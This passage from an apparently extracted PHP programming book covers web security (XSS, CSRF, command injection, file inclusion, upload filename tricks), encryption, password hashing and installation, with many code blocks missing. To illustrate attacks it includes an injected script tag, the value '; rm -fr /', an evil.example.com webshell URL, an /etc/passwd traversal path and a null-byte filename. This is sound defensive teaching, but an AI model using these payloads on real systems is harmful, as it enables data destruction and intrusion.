As the majority of websites run o? PHP, application security is an important topic for PHP developers to protect their website, data, and clients. This topic covers best security practices in PHP as well as common vulnerabilities and weaknesses with example ?xes in PHP.
Section 101.1: PHP Version Leakage
By default, PHP will tell the world what version of PHP you are using, e.g.


To ?x this you can either change php.ini:


Or change the header:


Or if you'd prefer a htaccess method:


If either of the above methods do not work, there is also the header_remove() function that provides you the ability to remove the header:


If attackers know that you are using PHP and the version of PHP that you are using, it's easier for them to exploit your server.
Section 101.2: Cross-Site Scripting (XSS)
Problem

Cross-site scripting is the unintended execution of remote code by a web client. Any web application might expose itself to XSS if it takes input from a user and outputs it directly on a web page. If input includes HTML or JavaScript, remote code can be executed when this content is rendered by the web client.
For example, if a 3rd party side contains a JavaScript ?le:


And a PHP application directly outputs a string passed into it:


If an unchecked GET parameter contains <script src="http://example.com/runme.js"></script> then the output of the PHP script will be:



The 3rd party JavaScript will run and the user will see "I'm running" on the web page.

Solution

As a general rule, never trust input coming from a client. Every GET, POST, and cookie value could be anything at all, and should therefore be validated. When outputting any of these values, escape them so they will not be evaluated in an unexpected way.
Keep in mind that even in the simplest applications data can be moved around and it will be hard to keep track of all sources. Therefore it is a best practice to always escape output.
PHP provides a few ways to escape output depending on the context.

Filter Functions

PHPs Filter Functions allow the input data to the php script to be sanitized or validated in many ways. They are useful when saving or outputting client input.
HTML Encoding

htmlspecialchars will convert any "HTML special characters" into their HTML encodings, meaning they will then not
be processed as standard HTML. To ?x our previous example using this method:


Would output:


Everything inside the <div> tag will not be interpreted as a JavaScript tag by the browser, but instead as a simple text node. The user will safely see:

URL Encoding

When outputting a dynamically generated URL, PHP provides the urlencode function to safely output valid URLs. So, for example, if a user is able to input data that becomes part of another GET parameter:


Any malicious input will be converted to an encoded URL parameter.

Using specialised external libraries or OWASP AntiSamy lists

Sometimes you will want to send HTML or other kind of code inputs. You will need to maintain a list of authorised words (white list) and un-authorized (blacklist).

You can download standard lists available at the OWASP AntiSamy website. Each list is ?t for a speci?c kind of interaction (ebay api, tinyMCE, etc...). And it is open source.
There are libraries existing to ?lter HTML and prevent XSS attacks for the general case and performing at least as well as AntiSamy lists with very easy use. For example you have HTML Puri?er
Section 101.3: Cross-Site Request Forgery
Problem

Cross-Site Request Forgery or CSRF can force an end user to unknowingly generate malicious requests to a web server. This attack vector can be exploited in both POST and GET requests. Let's say for example the url endpoint
/delete.php?accnt=12 deletes account as passed from accnt parameter of a GET request. Now if an authenticated user will encounter the following script in any other application


the account would be deleted.

Solution

A common solution to this problem is the use of CSRF tokens. CSRF tokens are embedded into requests so that a web application can trust that a request came from an expected source as part of the application's normal work?ow. First the user performs some action, such as viewing a form, that triggers the creation of a unique token. A sample form implementing this might look like


The token can then be validated by the server against the user session after form submission to eliminate malicious requests.
Sample code

Here is sample code for a basic implementation:




There are many libraries and frameworks already available which have their own implementation of CSRF validation. Though this is the simple implementation of CSRF, You need to write some code to regenerate your CSRF token dynamically to prevent from CSRF token stealing and ?xation.
Section 101.4: Command Line Injection
Problem

In a similar way that SQL injection allows an attacker to execute arbitrary queries on a database, command-line injection allows someone to run untrusted system commands on a web server. With an improperly secured server this would give an attacker complete control over a system.
Let's say, for example, a script allows a user to list directory contents on a web server.


(In a real-world application one would use PHP's built-in functions or objects to get path contents. This example is for a simple security demonstration.)
One would hope to get a path parameter similar to /tmp. But as any input is allowed, path could be ; rm -fr /. The web server would then execute the command


and attempt to delete all ?les from the root of the server.

Solution

All command arguments must be escaped using escapeshellarg() or escapeshellcmd(). This makes the arguments non-executable. For each parameter, the input value should also be validated.

In the simplest case, we can secure our example with




Following the previous example with the attempt to remove ?les, the executed command becomes


And the string is simply passed as a parameter to ls, rather than terminating the ls command and running rm.

It should be noted that the example above is now secure from command injection, but not from directory traversal. To ?x this, it should be checked that the normalized path starts with the desired sub-directory.
PHP o?ers a variety of functions to execute system commands, including exec, passthru, proc_open, shell_exec, and system. All must have their inputs carefully validated and escaped.
Section 101.5: Stripping Tags
strip_tags is a very powerful function if you know how to use it. As a method to prevent cross-site scripting attacks there are better methods, such as character encoding, but stripping tags is useful in some cases.

Basic Example

Raw Output


Allowing Tags

Say you wanted to allow a certain tag but no other tags, then you'd specify that in the second parameter of the function. This parameter is optional. In my case I only want the <b> tag to be passed through.


Raw Output


Notice(s)

HTML comments and PHP tags are also stripped. This is hardcoded and can not be changed with allowable_tags.

In PHP 5.3.4 and later, self-closing XHTML tags are ignored and only non-self-closing tags should be used in allowable_tags. For example, to allow both <br> and <br/>, you should use:


Section 101.6: File Inclusion
Remote File Inclusion
Remote File Inclusion (also known as RFI) is a type of vulnerability that allows an attacker to include a remote ?le. This example injects a remotely hosted ?le containing a malicious code:



/vulnerable.php?page=http://evil.example.com/webshell.txt?


Local File Inclusion

Local File Inclusion (also known as LFI) is the process of including ?les on a server through the web browser.



/vulnerable.php?page=../../../../etc/passwd


Solution to RFI & LFI:

It is recommended to only allow including ?les you approved, and limit to those only.


Section 101.7: Error Reporting
By default PHP will output errors, warnings and notice messages directly on the page if something unexpected in a script occurs. This is useful for resolving speci?c issues with a script but at the same time it outputs information you don't want your users to know.
Therefore it's good practice to avoid displaying those messages which will reveal information about your server, like your directory tree for example, in production environments. In a development or testing environment these messages may still be useful to display for debugging purposes.
A quick solution

You can turn them o? so the messages don't show at all, however this makes debugging your script harder.



Or change them directly in the php.ini.

Handling errors

A better option would be to store those error messages to a place they are more useful, like a database:


This method will log the messages to the database and if that fails to a ?le instead of echoing it directly into the page. This way you can track what users are experiencing on your website and notify you immediately if something go's wrong.
Section 101.8: Uploading ?les
If you want users to upload ?les to your server you need to do a couple of security checks before you actually move the uploaded ?le to your web directory.
The uploaded data:

This array contains user submitted data and is not information about the ?le itself. While usually this data is generated by the browser one can easily make a post request to the same form using software.


name - Verify every aspect of it.
type - Never use this data. It can be fetched by using PHP functions instead.
size - Safe to use.
tmp_name - Safe to use.


Exploiting the ?le name

Normally the operating system does not allow speci?c characters in a ?le name, but by spoo?ng the request you

can add them allowing for unexpected things to happen. For example, lets name the ?le:

../script.php%00.png

Take good look at that ?lename and you should notice a couple of things.

1. The ?rst to notice is the ../, fully illegal in a ?le name and at the same time perfectly ?ne if you are moving a ?le from 1 directory to another, which we're gonna do right?
2. Now you might think you were verifying the ?le extensions properly in your script but this exploit relies on the url decoding, translating %00 to a null character, basically saying to the operating system, this string ends here, stripping o? .png o? the ?lename.
So now I've uploaded script.php to another directory, by-passing simple validations to ?le extensions. It also by- passes .htaccess ?les disallowing scripts to be executed from within your upload directory.


Getting the ?le name and extension safely

You can use pathinfo() to extrapolate the name and extension in a safe manner but ?rst we need to replace unwanted characters in the ?le name:


While now we have a ?lename and extension that can be used for storing, I still prefer storing that information in a database and give that ?le a generated name of for example, md5(uniqid().microtime())


This would resolve the issue of duplicate ?le names and unforseen exploits in the ?le name. It would also cause the attacker to guess where that ?le has been stored as he or she cannot speci?cally target it for execution.

Mime-type validation

Checking a ?le extension to determine what ?le it is is not enough as a ?le may named image.png but may very well contain a php script. By checking the mime-type of the uploaded ?le against a ?le extension you can verify if the ?le contains what its name is referring to.
You can even go 1 step further for validating images, and that is actually opening them:


You can fetch the mime-type using a build-in function or a class.


White listing your uploads

Most importantly, you should whitelist ?le extensions and mime types depending on each form.


Chapter 102: Cryptography
Section 102.1: Symmetric Encryption and Decryption of large Files with OpenSSL
PHP lacks a build-in function to encrypt and decrypt large ?les. openssl_encrypt can be used to encrypt strings, but loading a huge ?le into memory is a bad idea.

So we have to write a userland function doing that. This example uses the symmetric AES-128-CBC algorithm to encrypt smaller chunks of a large ?le and writes them into another ?le.

Encrypt Files
/**
* Define the number of blocks that should be read from the source file for each chunk.
* For 'AES-128-CBC' each block consist of 16 bytes.
* So if we read 10,000 blocks we load 160kb into memory. You may adjust this value
* to read/write shorter or longer chunks.
*/
define('FILE_ENCRYPTION_BLOCKS', 10000);

/**
* Encrypt the passed file and saves the result in a new file with ".enc" as suffix.
* 
* @param string $source Path to file that should be encrypted
* @param string $key	The key used for the encryption
* @param string $dest	File name where the encryped file should be written to.
* @return string|false	Returns the file name that has been created or FALSE if an error occurred
*/
function encryptFile($source, $key, $dest)
{
$key = substr(sha1($key, true), 0, 16);
$iv = openssl_random_pseudo_bytes(16);

$error = false;
if ($fpOut = fopen($dest, 'w')) {
// Put the initialzation vector to the beginning of the file
fwrite($fpOut, $iv);
if ($fpIn = fopen($source, 'rb')) { while (!feof($fpIn)) {
$plaintext = fread($fpIn, 16 * FILE_ENCRYPTION_BLOCKS);
$ciphertext = openssl_encrypt($plaintext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA,

$iv);


// Use the first 16 bytes of the ciphertext as the next initialization vector
$iv = substr($ciphertext, 0, 16); fwrite($fpOut, $ciphertext);
}

fclose($fpIn);
} else {
$error = true;
}
fclose($fpOut);
} else {
$error = true;
}

return $error ? false : $dest;
}

Decrypt Files

To decrypt ?les that have been encrypted with the above function you can use this function.

/**
* Dencrypt the passed file and saves the result in a new file, removing the
* last 4 characters from file name.
* 
* @param string $source Path to file that should be decrypted
* @param string $key	The key used for the decryption (must be the same as for encryption)
* @param string $dest	File name where the decryped file should be written to.
* @return string|false	Returns the file name that has been created or FALSE if an error occurred
*/
function decryptFile($source, $key, $dest)
{
$key = substr(sha1($key, true), 0, 16);

$error = false;
if ($fpOut = fopen($dest, 'w')) {
if ($fpIn = fopen($source, 'rb')) {
// Get the initialzation vector from the beginning of the file
$iv = fread($fpIn, 16); while (!feof($fpIn)) {
$ciphertext = fread($fpIn, 16 * (FILE_ENCRYPTION_BLOCKS + 1)); // we have to read
one block more for decrypting than for encrypting
$plaintext = openssl_decrypt($ciphertext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA,

$iv);


// Use the first 16 bytes of the ciphertext as the next initialization vector
$iv = substr($ciphertext, 0, 16); fwrite($fpOut, $plaintext);
}

fclose($fpIn);
} else {
$error = true;
}
fclose($fpOut);
} else {
$error = true;
}

return $error ? false : $dest;
}

How to use

If you need a small snippet to see how this works or to test the above functions, look at the following code.


This will create three ?les:

1. test?le.txt with the plain text
2. test?le.txt.enc with the encrypted ?le
3. test?le.txt.dec with the decrypted ?le. This should have the same content as test?le.txt

Section 102.2: Symmetric Cipher
This example illustrates the AES 256 symmetric cipher in CBC mode. An initialization vector is needed, so we generate one using an openssl function. The variable $strong is used to determine whether the IV generated was cryptographically strong.

Encryption
Decryption

Base64 Encode & Decode

If the encrypted data needs to be sent or stored in printable text, then the base64_encode() and base64_decode()
functions should be used respectively.


Chapter 103: Password Hashing Functions
As more secure web services avoid storing passwords in plain text format, languages such as PHP provide various (undecryptable) hash functions to support the more secure industry standard. This topic provides documentation for proper hashing with PHP.
Section 103.1: Creating a password hash
Create password hashes using password_hash() to use the current industry best-practice standard hash or key derivation. At time of writing, the standard is bcrypt, which means, that PASSWORD_DEFAULT contains the same value as PASSWORD_BCRYPT.


The third parameter is not mandatory.

The 'cost' value should be chosen based on your production server's hardware. Increasing it will make the password more costly to generate. The costlier it is to generate the longer it will take anyone trying to crack it to generate it also. The cost should ideally be as high as possible, but in practice it should be set so it does not slow down everything too much. Somewhere between 0.1 and 0.4 seconds would be okay. Use the default value if you are in doubt.
Version < 5.5

On PHP lower than 5.5.0 the password_* functions are not available. You should use the compatibility pack to substitute those functions. Notice the compatibility pack requires PHP 5.3.7 or higher or a version that has the $2y ?x backported into it (such as RedHat provides).

If you are not able to use those, you can implement password hashing with crypt() As password_hash() is implemented as a wrapper around the crypt() function, you need not lose any functionality.

Salt for password hash

Despite of reliability of crypt algorithm there is still vulnerability against rainbow tables. That's the reason, why it's recommended to use salt.
A salt is something that is appended to the password before hashing to make source string unique. Given two identical passwords, the resulting hashes will be also unique, because their salts are unique.
A random salt is one of the most important pieces of your password security. This means that even with a lookup table of known password hashes an attacker can't match up your user's password hash with the database password hashes since a random salt has been used. You should use always random and cryptographically secure salts. Read more
With password_hash() bcrypt algorithm, plain text salt is stored along with the resulting hash, which means that the hash can be transferred across di?erent systems and platforms and still be matched against the original password.
Version < 7.0

Even when this is discouraged, you can use the salt option to de?ne your own random salt.


Important. If you omit this option, a random salt will be generated by password_hash() for each password hashed. This is the intended mode of operation.
Version = 7.0

The salt option has been deprecated as of PHP 7.0.0. It is now preferred to simply use the salt that is generated by default.

Section 103.2: Determine if an existing password hash can be upgraded to a stronger algorithm
If you are using the PASSWORD_DEFAULT method to let the system choose the best algorithm to hash your passwords with, as the default increases in strength you may wish to rehash old passwords as users log in


If the password_* functions are not available on your system (and you cannot use the compatibility pack linked in the remarks below), you can determine the algorithm and used to create the original hash in a method similar to

the following:


Section 103.3: Verifying a password against a hash
password_verify() is the built-in function provided (as of PHP 5.5) to verify the validity of a password against a known hash.


All supported hashing algorithms store information identifying which hash was used in the hash itself, so there is no need to indicate which algorithm you are using to encode the plaintext password with.
If the password_* functions are not available on your system (and you cannot use the compatibility pack linked in the remarks below) you can implement password veri?cation with the crypt() function. Please note that speci?c precautions must be taken to avoid timing attacks.


Chapter 104: Contributing to the PHP Manual
The PHP Manual provides both a functional reference and a language reference along with explanations of PHP's major features. The PHP Manual, unlike most languages' documentation, encourages PHP developers to add their own examples and notes to each page of the documentation. This topic explains contribution to the PHP manual, along with tips, tricks, and guidelines for best practice.
Section 104.1: Improve the o?cial documentation
PHP has great o?cial documentation already at http://php.net/manual/. The PHP Manual documents pretty much all language features, the core libraries and most available extensions. There are plenty of examples to learn from. The PHP Manual is available in multiple languages and formats.
Best of all, the documentation is free for anyone to edit.

The PHP Documentation Team provides an online editor for the PHP Manual at https://edit.php.net. It supports multiple Single-Sign-On services, including logging in with your Stack Over?ow account. You can ?nd an introduction to the editor at https://wiki.php.net/doc/editor.
Changes to the PHP Manual need to be approved by people from the PHP Documentation Team having Doc Karma. Doc Karma is somewhat like reputation, but harder to get. This peer review process makes sure only factually correct information gets into the PHP Manual.
The PHP Manual is written in DocBook, which is an easy to learn markup language for authoring books. It might look a little bit complicated at ?rst sight, but there are templates to get you started. You certainly don't need to be a DocBook expert to contribute.
Section 104.2: Tips for contributing to the manual
The following is a list of tips for those who are looking to contribute to the PHP manual:

Follow the manual's style guidelines. Ensure that the manual's style guidelines are always being followed for consistency's sake.
Perform spelling and grammar checks. Ensure proper spelling and grammar is being used - otherwise the information presented may be more di?cult to assimilate, and the content will look less professional.
Be terse in explanations. Avoid rambling to clearly and concisely present the information to developers who are looking to quickly reference it.
Separate code from its output. This gives cleaner and less convoluted code examples for developers to digest.
Check the page section order. Ensure that all sections of the manual page being edited are in the correct order. Uniformity in the manual makes it easier to quickly read and lookup information.
Remove PHP 4-related content. Speci?c mentions to PHP 4 are no longer relevant given how old it is now. Mentions of it should be removed from the manual to prevent convoluting it with unnecessary information. Properly version ?les. When creating new ?les in the documentation, ensure that the revision ID of the ?le is set to nothing, like so: <!-- $Revision$ -->.
Merge useful comments into the manual. Some comments contribute useful information that the manual could bene?t from having. These should be merged into the main page's content.
Don't break the documentation build. Always ensure that the PHP manual builds properly before committing the changes.

Chapter 105: Contributing to the PHP Core
Section 105.1: Setting up a basic development environment
PHP's source code is hosted on GitHub. To build from source you will ?rst need to check out a working copy of the code.


If you want to add a feature, it's best to create your own branch.


Finally, con?gure and build PHP


If con?guration fails due to missing dependencies, you will need to use your operating system's package management system to install them (e.g. yum, apt, etc.) or download and compile them from source.

Appendix A: Installing a PHP environment on Windows
Section A.1: Download, Install and use WAMP
WampServer is a Windows web development environment. It allows you to create web applications with Apache2, PHP and a MySQL database. Alongside, PhpMyAdmin allows you to manage easily your databases.
WampServer is available for free (under GPML license) in two distinct versions : 32 and 64 bits. Wampserver 2.5 is not compatible with Windows XP, neither with SP3, nor Windows Server 2003. Older WampServer versions are available on SourceForge.
WampServer versions:

WampServer (64 BITS) 3 WampServer (32 BITS) 3
Providing currently:

Apache: 2.4.18
MySQL: 5.7.11
PHP: 5.6.19 & 7.0.4

Installation is simple, just execute the installer, choose the location and ?nish it.

Once that is done, you may start WampServer. Then it starts in the system tray (taskbar), initially red in color and then turns green once the server is up.
You may goto a browser and type localhost or 127.0.0.1 to get the index page of WAMP. You may work on PHP locally from now by storing the ?les in <PATH_TO_WAMP>/www/<php_or_html_file> and check the result on http://localhost/<php_or_html_file_name>
Section A.2: Install PHP and use it with IIS
First of all you need to have IIS (Internet Information Services) installed and running on your machine; IIS isn't available by default, you have to add the characteristic from Control Panel -> Programs -> Windows Characteristics.

1. Download the PHP version you like from http://windows.php.net/download/ and make sure you download the Non-Thread Safe (NTS) versions of PHP.
2. Extract the ?les into C:\PHP\.
3. Open the Internet Information Services Administrator IIS.
4. Select the root item in the left panel.
5. Double click on Handler Mappings.
6. On the right side panel click on Add Module Mapping.
7. Setup the values like this:


8. Install vcredist_x64.exe or vcredist_x86.exe (Visual C++ 2012 Redistributable) from

https://www.microsoft.com/en-US/download/details.aspx?id=30679
9. Setup your C:\PHP\php.ini, especially set the extension_dir ="C:\PHP\ext".
10. Reset IIS: In a DOS command console type IISRESET.

Optionally you can install the PHP Manager for IIS which is of great help to setup the ini ?le and track the log of errors (doesn't work on Windows 10).
Remember to set index.php as one of the default documents for IIS. If you followed the installation guide now you are ready to test PHP.
Just like Linux, IIS has a directory structure on the server, the root of this tree is C:\inetpub\wwwroot\, here is the point of entry for all your public ?les and PHP scripts.

Now use your favorite editor, or just Windows Notepad, and type the following:


Save the ?le under C:\inetpub\wwwroot\index.php using the UTF-8 format (without BOM).

Then open your brand new website using your browser on this address: http://localhost/index.php

Section A.3: Download and Install XAMPP
What is XAMPP?

XAMPP is the most popular PHP development environment. XAMPP is a completely free, open-source and easy to install Apache distribution containing MariaDB, PHP, and Perl.
Where should I download it from?

Download appropriate stable XAMPP version from their download page. Choose the download based on the type of OS (32 or 64bit and OS version) and the PHP version it has to support.
Current latest being XAMPP for Windows 7.0.8 / PHP 7.0.8. Or you can follow this:
XAMPP for Windows exists in three di?erent ?avors:

Installer (Probably .exe format the easiest way to install XAMPP) ZIP (For purists: XAMPP as ordinary ZIP .zip format archive)
7zip: (For purists with low bandwidth: XAMPP as 7zip .7zip format archive)
How to install and where should I place my PHP/html ?les? Install with the provided installer
1. Execute the XAMPP server installer by double clicking the downloaded .exe.

Install from the ZIP

1. Unzip the zip archives into the folder of your choice.
2. XAMPP is extracting to the subdirectory C:\xampp below the selected target directory.

3. Now start the ?le setup_xampp.bat, to adjust the XAMPP con?guration to your system.


Note: If you choose a root directory C:\ as target, you must not start setup_xampp.bat.


Post-Install

Use the "XAMPP Control Panel" for additional tasks, like starting/stopping Apache, MySQL, FileZilla and Mercury or installing these as services.
File handling

The installation is a straight forward process and once the installation is complete you may add html/php ?les to be hosted on the server in XAMPP-root/htdocs/. Then start the server and open http://localhost/file.php on a browser to view the page.

Note: Default XAMPP root in Windows is C:/xampp/htdocs/


Type in one of the following URLs in your favourite web browser:


Now you should see the XAMPP start page.



Appendix B: Installing on Linux/Unix Environments
Section B.1: Command Line Install Using APT for PHP 7

This will only install PHP. If you wish to serve a PHP ?le to the web you will also need to install a web- server such as Apache, Nginx, or use PHP's built in web-server (php version 5.4+).


If you are in a Ubuntu version below 16.04 and want to use PHP 7 anyway, you can add Ondrej's PPA repository by doing: sudo add-apt-repository ppa:ondrej/php

Make sure that all of your repositories are up to date:


After updating your system's repositories, install PHP:


Let's test the installation by checking the PHP version:


This should output something like this.

Note: Your output will be slightly di?erent.


You now have the capability to run PHP from the command line.

Section B.2: Installing in Enterprise Linux distributions (CentOS, Scienti?c Linux, etc)
Use the yum command to manage packages in Enterprise Linux-based operating systems:


This installs a minimal install of PHP including some common features. If you need additional modules, you will need to install them separately. Once again, you can use yum to search for these packages:


Example output:



To install the gd library:


Enterprise Linux distributions have always been conservative with updates, and typically do not update beyond the point release they shipped with. A number of third party repositories provide current versions of PHP:
IUS
Remi Colette Webtatic
IUS and Webtatic provide replacement packages with di?erent names (e.g. php56u or php56w to install PHP 5.6) while Remi's repository provides in-place upgrades by using the same names as the system packages.

Following are instructions on installing PHP 7.0 from Remi's repository. This is the simplest example, as uninstalling the system packages is not required.

